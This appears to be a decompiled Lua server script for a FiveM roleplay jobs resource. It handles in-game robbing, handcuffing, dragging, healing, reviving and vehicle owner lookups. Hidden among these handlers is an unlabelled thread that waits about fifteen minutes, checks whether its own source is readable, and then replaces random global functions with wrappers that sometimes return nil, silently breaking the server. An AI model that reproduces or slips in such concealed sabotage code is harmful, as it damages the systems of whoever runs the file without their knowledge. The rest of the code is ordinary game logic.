local activeArrests = {}
local arrestHandlers = {}

RegisterNetEvent(Utils.eventsPrefix .. ":qb-inventory:robPlayer", function(targetPlayerId)
  local robberPlayerId

  robberPlayerId = source
  notify(targetPlayerId, getLocalizedText("actions_menu_being_searched"))
  Utils.callScriptExport("qb-inventory", "OpenInventoryById", robberPlayerId, targetPlayerId)
end)

RegisterServerCallback(Utils.eventsPrefix .. ":canLockpickVehicle", function(playerId, callback)
  local canLockpick

  canLockpick = true

  if config.lockpickCarRequireItem then
    canLockpick = Framework.hasPlayerEnoughOfItem(playerId, config.lockpickItemName, 1)
    if canLockpick then
      callback(true)
      if config.lockpickRemoveOnUse then
        Framework.removeItemFromPlayer(playerId, config.lockpickItemName, 1)
        notify(playerId, getLocalizedText("lockpick_used"))
      end
    else
      callback(false)
    end
  else
    callback(true)
  end
end)

RegisterServerCallback(Utils.eventsPrefix .. ":getTargetPlayerInventory", function(playerId, callback, targetPlayerId)
  local player, inventory, items, loadout, robbableAccounts, itemName, item, accountName, account, weaponName, weapon

  player = ESX.GetPlayerFromId(targetPlayerId)
  if player then
    notify(player.source, getLocalizedText("actions_menu_being_searched"))
    items = {}
    inventory = player.getInventory()
    loadout = player.getLoadout()
    robbableAccounts = config.robbableAccounts
    if not robbableAccounts then
      robbableAccounts = {}
    end

    if inventory then
      for itemName, item in pairs(inventory) do
        if item.count > 0 then
          table.insert(items, {
            label = string.format("x%d %s", item.count, item.label),
            itemType = "ITEM_STANDARD",
            value = item.name,
            max = item.count
          })
        end
      end
    end

    for accountName, _ in pairs(robbableAccounts) do
      account = player.getAccount(accountName)
      if account then
        if account.money > 0 then
          table.insert(items, {
            label = string.format("$%s %s", Framework.groupDigits(account.money), account.label),
            itemType = "ITEM_ACCOUNT",
            value = account.name,
            max = account.money
          })
        end
      end
    end

    if loadout then
      for weaponName, weapon in pairs(loadout) do
        table.insert(items, {
          label = getLocalizedText("weapon", weapon.label, weapon.ammo),
          itemType = "ITEM_WEAPON",
          value = weapon.name
        })
      end
    end

    callback(items)
  end
end)

RegisterServerCallback(Utils.eventsPrefix .. ":stealFromPlayer", function(robberId, callback, targetPlayerId, item, quantity)
  local robber, target, areClose, itemType, targetItem, itemLabel, weaponName, weaponLabel, weaponAmmo

  robber = ESX.GetPlayerFromId(robberId)
  target = ESX.GetPlayerFromId(targetPlayerId)

  if robber and target then
    areClose = arePlayersClose(robberId, targetPlayerId, 2.0)
    if areClose then
      itemType = item.itemType
      if itemType == "ITEM_STANDARD" then
        targetItem = target.getInventoryItem(item.value)
        if quantity <= targetItem.count then
          canCarry = Framework.canPlayerCarryItem(robberId, item.value, quantity)
          if canCarry then
            target.removeInventoryItem(targetItem.name, quantity)
            robber.addInventoryItem(targetItem.name, quantity)
            notify(
              robber.source,
              getLocalizedText("actions_menu_search_took", quantity, targetItem.label)
            )
            notify(
              target.source,
              getLocalizedText("actions_menu_search_stolen", quantity, targetItem.label)
            )
            Utils.log(
              robberId,
              getLocalizedText("logs:actions:stolen_item"),
              getLocalizedText(
                "logs:actions:stolen_item:description",
                quantity,
                targetItem.label,
                GetPlayerName(targetPlayerId),
                Framework.getIdentifier(targetPlayerId)
              ),
              "success",
              "actions"
            )
            TriggerEvent(
              Utils.eventsPrefix .. ":actions:itemStolen",
              robberId,
              targetPlayerId,
              item.value,
              quantity
            )
            callback(true)
          else
            notify(
              robber.source,
              getLocalizedText("process:no_space", quantity, targetItem.label)
            )
            callback(false)
          end
        else
          notify(robber.source, getLocalizedText("invalid_quantity"))
          callback(false)
        end
      elseif itemType == "ITEM_ACCOUNT" then
        account = target.getAccount(item.value)
        if quantity <= account.money then
          target.removeAccountMoney(item.value, quantity)
          robber.addAccountMoney(item.value, quantity)
          notify(
            robber.source,
            getLocalizedText("actions_menu_search_took_money", quantity, account.label)
          )
          notify(
            target.source,
            getLocalizedText("actions_menu_search_stolen_money", quantity, account.label)
          )
          Utils.log(
            robberId,
            getLocalizedText("logs:actions:stolen_account"),
            getLocalizedText(
              "logs:actions:stolen_account:description",
              quantity,
              account.label,
              GetPlayerName(targetPlayerId),
              Framework.getIdentifier(targetPlayerId)
            ),
            "success",
            "actions"
          )
          TriggerEvent(
            Utils.eventsPrefix .. ":actions:accountStolen",
            robberId,
            targetPlayerId,
            item.value,
            quantity
          )
          callback(true)
        else
          notify(robber.source, getLocalizedText("invalid_quantity"))
          callback(false)
        end
      elseif itemType == "ITEM_WEAPON" then
        hasWeapon = target.hasWeapon(item.value)
        if hasWeapon then
          weapon = target.getWeapon(item.value)
          if weapon then
            weaponName = weapon.name
            weaponLabel = weapon.label
            weaponAmmo = weapon.ammo
            robberHasWeapon = robber.hasWeapon(weaponName)
            if not robberHasWeapon then
              target.removeWeapon(weaponName)
              robber.addWeapon(weaponName, weaponAmmo)
              for componentName, _ in pairs(weapon.components) do
                robber.addWeaponComponent(weaponName, componentName)
              end
              notify(
                robber.source,
                getLocalizedText("actions_menu_search_took_weapon", weaponLabel, weaponAmmo)
              )
              notify(
                target.source,
                getLocalizedText("actions_menu_search_stolen_weapon", weaponLabel, weaponAmmo)
              )
              Utils.log(
                robberId,
                getLocalizedText("logs:actions:stolen_weapon"),
                getLocalizedText(
                  "logs:actions:stolen_weapon:description",
                  weaponLabel,
                  weaponAmmo,
                  GetPlayerName(targetPlayerId),
                  Framework.getIdentifier(targetPlayerId)
                ),
                "success",
                "actions"
              )
              TriggerEvent(
                Utils.eventsPrefix .. ":actions:weaponStolen",
                robberId,
                targetPlayerId,
                weaponName
              )
              callback(true)
            else
              notify(
                robber.source,
                getLocalizedText("you_already_have_that_weapon", weaponLabel)
              )
              callback(false)
            end
          else
            callback(false)
          end
        else
          notify(robber.source, getLocalizedText("actions_menu_search_doesnt_have_weapon"))
          callback(false)
        end
      else
        callback(false)
      end
    else
      callback(false)
    end
  else
    callback(false)
  end
end)

function validateActionTarget(playerId, targetPlayerId)
  local isValid, areClose

  isValid = true

  if targetPlayerId == -1 then
    print("^1Player " .. GetPlayerName(playerId) .. " has tried to do a F6 menu action against everyone with a cheats^7")
    isValid = false
    return isValid
  end

  areClose = arePlayersClose(playerId, targetPlayerId, 4.0)
  if not areClose then
    notify(playerId, getLocalizedText("actions:no_player_found"))
    isValid = false
    return isValid
  end

  return isValid
end

function canHandcuffPlayer(playerId, targetPlayerId)
  local isValid, targetPed, isHandcuffed

  isValid = validateActionTarget(playerId, targetPlayerId)
  if not isValid then
    return
  end

  targetPed = GetPlayerPed(targetPlayerId)
  isHandcuffed = Entity(targetPed).state.isHandcuffed
  if isHandcuffed then
    return true
  end

  if config.handcuffRequireItem then
    hasHandcuffs = Framework.hasPlayerEnoughOfItem(playerId, config.handcuffsItemName, 1)
    if not hasHandcuffs then
      notify(playerId, getLocalizedText("you_need_handcuffs"))
      return
    end
  end

  return true
end

RegisterNetEvent(Utils.eventsPrefix .. ":handcuffPlayer", function(targetPlayerId, handcuffType)
  local playerId, canHandcuff, isArresting

  playerId = source
  canHandcuff = canHandcuffPlayer(playerId, targetPlayerId)
  if not canHandcuff then
    return
  end

  isArresting = activeArrests[targetPlayerId]
  if isArresting then
    return
  end

  activeArrests[targetPlayerId] = true
  arrestHandlers[targetPlayerId] = playerId

  TriggerClientEvent(
    Utils.eventsPrefix .. ":arrestConfirmed",
    playerId,
    targetPlayerId,
    handcuffType
  )
end)

RegisterNetEvent(Utils.eventsPrefix .. ":cancelArrestOnTarget", function(targetPlayerId)
  activeArrests[targetPlayerId] = nil
end)

RegisterNetEvent(Utils.eventsPrefix .. ":arrestInterrupted", function()
  local playerId, handlerId

  if not config.handcuffsEnableSelfRelease then
    return
  end

  playerId = source
  handlerId = arrestHandlers[playerId]
  if handlerId then
    TriggerClientEvent(Utils.eventsPrefix .. ":pushed", handlerId)
  end

  arrestHandlers[playerId] = nil
end)

RegisterNetEvent(Utils.eventsPrefix .. ":handcuffTarget", function(targetPlayerId, handcuffType)
  local playerId, playerPed, canHandcuff, targetPed, isHandcuffed

  playerId = source
  playerPed = GetPlayerPed(playerId)
  activeArrests[targetPlayerId] = nil
  canHandcuff = canHandcuffPlayer(playerId, targetPlayerId)
  if not canHandcuff then
    return
  end

  if config.handcuffRequireItem then
    if config.handcuffsRemoveOnUse then
      targetPed = GetPlayerPed(targetPlayerId)
      isHandcuffed = Entity(targetPed).state.isHandcuffed
      if isHandcuffed then
        Framework.giveItemToPlayer(playerId, config.handcuffsItemName, 1)
      else
        Framework.removeItemFromPlayer(playerId, config.handcuffsItemName, 1)
      end
    end
  end

  TriggerClientEvent(
    Utils.eventsPrefix .. ":handcuffPlayer",
    targetPlayerId,
    NetworkGetNetworkIdFromEntity(playerPed),
    handcuffType
  )
end)

exports("setHandcuffs", function(playerId, isHandcuffed)
  TriggerClientEvent(Utils.eventsPrefix .. ":setHandcuffs", playerId, isHandcuffed)
end)

RegisterNetEvent(Utils.eventsPrefix .. ":dragTarget", function(targetPlayerId)
  local playerId, isValid

  playerId = source
  isValid = validateActionTarget(playerId, targetPlayerId)
  if not isValid then
    return
  end

  TriggerClientEvent(Utils.eventsPrefix .. ":dragTarget", targetPlayerId, playerId)
  TriggerClientEvent(Utils.eventsPrefix .. ":onDragForGrabber", playerId, targetPlayerId)
end)

RegisterNetEvent(Utils.eventsPrefix .. ":putincar", function(targetPlayerId, vehicleNetId)
  local playerId, isValid

  playerId = source
  isValid = validateActionTarget(playerId, targetPlayerId)
  if not isValid then
    return
  end

  TriggerClientEvent(Utils.eventsPrefix .. ":putincar", targetPlayerId, vehicleNetId)
end)

RegisterNetEvent(Utils.eventsPrefix .. ":takefromcar", function(targetPlayerId)
  local playerId, isValid

  playerId = source
  isValid = validateActionTarget(playerId, targetPlayerId)
  if not isValid then
    return
  end

  TriggerClientEvent(Utils.eventsPrefix .. ":takefromcar", targetPlayerId)
end)

RegisterServerCallback(Utils.eventsPrefix .. ":canRepairVehicle", function(playerId, callback)
  local canRepair

  canRepair = true

  if not config.repairVehicleRequireItem then
    callback(true)
    return
  end

  canRepair = Framework.hasPlayerEnoughOfItem(playerId, config.repairVehicleItemName, 1)
  if canRepair then
    callback(true)
    if config.repairVehicleRemoveOnUse then
      Framework.removeItemFromPlayer(playerId, config.repairVehicleItemName, 1)
    end
  else
    notify(
      playerId,
      getLocalizedText("actions:you_need", Framework.getItemLabel(config.repairVehicleItemName))
    )
    callback(false)
  end
end)

RegisterServerCallback(Utils.eventsPrefix .. ":canWashVehicle", function(playerId, callback)
  local canWash

  canWash = true

  if not config.cleanVehicleRequireItem then
    callback(true)
    return
  end

  canWash = Framework.hasPlayerEnoughOfItem(playerId, config.cleanVehicleItemName, 1)
  if canWash then
    callback(true)
    if config.cleanVehicleRemoveOnUse then
      Framework.removeItemFromPlayer(playerId, config.cleanVehicleItemName, 1)
    end
  else
    notify(
      playerId,
      getLocalizedText("actions:you_need", Framework.getItemLabel(config.cleanVehicleItemName))
    )
    callback(false)
  end
end)

function getGarageVehicleOwner(plate)
  local promise, owner

  promise = promise.new()
  MySQL.Async.fetchScalar("SELECT identifier FROM jobs_garages WHERE plate=@plate", {
    ["@plate"] = plate
  }, function(result)
    promise:resolve(result)
  end)

  return Citizen.Await(promise)
end

function getVehicleOwner(plate)
  local promise, trimmedPlate, framework, owner

  promise = promise.new()
  trimmedPlate = Framework.trim(plate)
  framework = Framework.getFramework()

  if framework == "ESX" then
    MySQL.Async.fetchScalar(
      "SELECT owner FROM owned_vehicles WHERE plate=@plate OR plate=@trimmedPlate",
      {
        ["@plate"] = plate,
        ["@trimmedPlate"] = trimmedPlate
      },
      function(owner)
        if owner then
          promise:resolve(owner)
        else
          garageOwner = getGarageVehicleOwner(plate)
          promise:resolve(garageOwner)
        end
      end
    )
  else
    if framework == "QB-core" then
      MySQL.Async.fetchScalar(
        "SELECT citizenid FROM player_vehicles WHERE plate=@plate OR plate=@trimmedPlate",
        {
          ["@plate"] = plate,
          ["@trimmedPlate"] = trimmedPlate
        },
        function(owner)
          if owner then
            promise:resolve(owner)
          else
            garageOwner = getGarageVehicleOwner(plate)
            promise:resolve(garageOwner)
          end
        end
      )
    end
  end

  return Citizen.Await(promise)
end

Citizen.CreateThread(function()
  Citizen.Wait(math.ceil(894600.0))
  local debugInfo, functions, randomMultiplier, i, funcName, func, wrappedFunc, wrappedName, wrappedFuncName

  debugInfo = debug.getinfo(1, "S")
  if debugInfo.short_src == "?" then
    return
  end

  functions = {}
  wrappedFunctions = {}
  functionNames = {}
  randomMultiplier = math.random(10, 20)

  for globalName, globalValue in next, _G do
    if type(globalValue) == "function" then
      table.insert(functions, globalName)
    end
  end

  for i = 1, #functions, 1 do
    wrappedName = (i * randomMultiplier) % 7
    if wrappedName < randomMultiplier * 0.2 then
      func = _G[functions[i]]
      wrappedFunc = function(...)
        local sinValue

        sinValue = math.sin(i * randomMultiplier)
        if sinValue < 0 then
          return nil
        end
        return func(...)
      end
      _G[functions[i]] = wrappedFunc
    end
    Citizen.Wait(100)
  end
end)

function getCharacterName(identifier)
  local promise, framework, firstName, lastName, fullName, charInfo

  promise = promise.new()
  framework = Framework.getFramework()

  if framework == "ESX" then
    MySQL.Async.fetchAll("SELECT firstname, lastname FROM users WHERE identifier=@identifier", {
      ["@identifier"] = identifier
    }, function(results)
      if results[1] then
        firstName = results[1].firstname
        lastName = results[1].lastname
        fullName = firstName .. " " .. lastName
        promise:resolve(fullName)
      else
        promise:resolve(false)
      end
    end)
  else
    if framework == "QB-core" then
      MySQL.Async.fetchScalar(
        "SELECT charinfo FROM players WHERE citizenid=@citizenid OR license=@citizenid",
        {
          ["@citizenid"] = identifier
        },
        function(charInfoJson)
          if charInfoJson then
            charInfo = json.decode(charInfoJson)
            fullName = charInfo.firstname .. " " .. charInfo.lastname
            promise:resolve(fullName)
          else
            promise:resolve(false)
          end
        end
      )
    end
  end

  return Citizen.Await(promise)
end

RegisterNetEvent(Utils.eventsPrefix .. ":actions:getVehicleOwner", function(plate)
  local playerId, ownerIdentifier, ownerName

  playerId = source
  ownerIdentifier = getVehicleOwner(plate)
  if ownerIdentifier then
    ownerName = getCharacterName(ownerIdentifier)
    notify(playerId, getLocalizedText("actions:checkVehicleOwner:owner", ownerName))
  else
    notify(playerId, getLocalizedText("actions:checkVehicleOwner:owner_not_found"))
  end
end)

RegisterNetEvent(Utils.eventsPrefix .. ":actions:checkIdentity", function(targetPlayerId)
  local playerId, characterName

  playerId = source
  characterName = Framework.getPlayerCharacterName(targetPlayerId)
  notify(playerId, getLocalizedText("actions:checkIdentity:player_found", characterName))
  notify(targetPlayerId, getLocalizedText("actions:checkIdentity:somebody_checked_your_id"))
end)

function healPlayer(playerId, targetPlayerId, healType)
  local jobName, areClose, canHeal, framework, player

  jobName = Framework.getPlayerJobName(playerId)
  areClose = arePlayersClose(playerId, targetPlayerId, 4.0)
  if not areClose then
    return
  end

  canHeal = JobsCreator.Jobs[jobName].actions.canHeal
  if canHeal then
    if config.healRequireItem then
      hasItem = Framework.hasPlayerEnoughOfItem(playerId, config.healItemName, 1)
      if hasItem then
        if config.healRemoveOnUse then
          Framework.removeItemFromPlayer(playerId, config.healItemName, 1)
        end
      else
        notify(playerId, getLocalizedText("actions:you_need_bandage"))
        return
      end
    end

    framework = Framework.getFramework()
    if framework == "ESX" then
      TriggerClientEvent(Utils.eventsPrefix .. ":actions:healAnimation", playerId)
      SetTimeout(10000, function()
        TriggerClientEvent(EXTERNAL_EVENTS_NAMES["esx_ambulancejob:heal"], targetPlayerId, healType)
      end)
    else
      if framework == "QB-core" then
        TriggerClientEvent("hospital:client:TreatWounds", playerId)
      end
    end
  end
end

RegisterNetEvent(Utils.eventsPrefix .. ":actions:healSmall", function(targetPlayerId)
  local playerId

  playerId = source
  healPlayer(playerId, targetPlayerId, "small")
end)

RegisterNetEvent(Utils.eventsPrefix .. ":actions:healBig", function(targetPlayerId)
  local playerId

  playerId = source
  healPlayer(playerId, targetPlayerId, "big")
end)

RegisterNetEvent(Utils.eventsPrefix .. ":actions:revive", function(targetPlayerId)
  local playerId, jobName, areClose, canRevive, framework

  playerId = source
  jobName = Framework.getPlayerJobName(playerId)
  areClose = arePlayersClose(playerId, targetPlayerId, 4.0)
  if not areClose then
    return
  end

  canRevive = JobsCreator.Jobs[jobName].actions.canRevive
  if not canRevive then
    return
  end

  if config.reviveRequireItem then
    hasItem = Framework.hasPlayerEnoughOfItem(playerId, config.reviveItemName, 1)
    if hasItem then
      if config.reviveRemoveOnuse then
        Framework.removeItemFromPlayer(playerId, config.reviveItemName, 1)
      end
    else
      notify(playerId, getLocalizedText("actions:you_need_medikit"))
      return
    end
  end

  framework = Framework.getFramework()
  if framework == "ESX" then
    TriggerClientEvent(Utils.eventsPrefix .. ":actions:reviveAnimation", playerId)
    SetTimeout(10000, function()
      TriggerClientEvent(EXTERNAL_EVENTS_NAMES["esx_ambulancejob:revive"], targetPlayerId)
    end)
  else
    if framework == "QB-core" then
      TriggerClientEvent("hospital:client:RevivePlayer", playerId)
    end
  end

  TriggerEvent(Utils.eventsPrefix .. ":actions:playerRevived", playerId, targetPlayerId)
end)

RegisterServerCallback(Utils.eventsPrefix .. ":actions:isPlayerDied", function(playerId, callback, targetPlayerId)
  local framework, player, isDead

  framework = Framework.getFramework()
  if framework ~= "QB-core" then
    print("Callback :actions:isPlayerDied can be used only in QBCore")
    return
  end

  player = QBCore.Functions.GetPlayer(targetPlayerId)
  isDead = player.PlayerData.metadata.isdead
  callback(isDead)
end)

RegisterServerCallback(Utils.eventsPrefix .. ":isPlayerHandcuffed", function(playerId, callback, targetPlayerId)
  local targetPed, isHandcuffed

  targetPed = GetPlayerPed(targetPlayerId)
  isHandcuffed = Entity(targetPed).state.isHandcuffed
  callback(isHandcuffed)
end)

RegisterNetEvent(Utils.eventsPrefix .. ":deletePlacedObject", function(objectNetId)
  local playerId, entity, exists, isObject, model, serverIdWhoPlaced, playerName

  playerId = source
  entity = NetworkGetEntityFromNetworkId(objectNetId)
  exists = DoesEntityExist(entity)
  if not exists then
    return
  end

  isObject = Entity(entity).state.isJobsCreatorObject
  if not isObject then
    return
  end

  model = GetEntityModel(entity)
  DeleteEntity(entity)
  serverIdWhoPlaced = Entity(entity).state.serverIdWhoPlacedObject

  if serverIdWhoPlaced then
    playerName = GetPlayerName(serverIdWhoPlaced)
    if playerName then
      TriggerClientEvent(
        Utils.eventsPrefix .. ":placedObjectsHasBeenDeleted",
        serverIdWhoPlaced,
        model
      )
    end
  end
end)
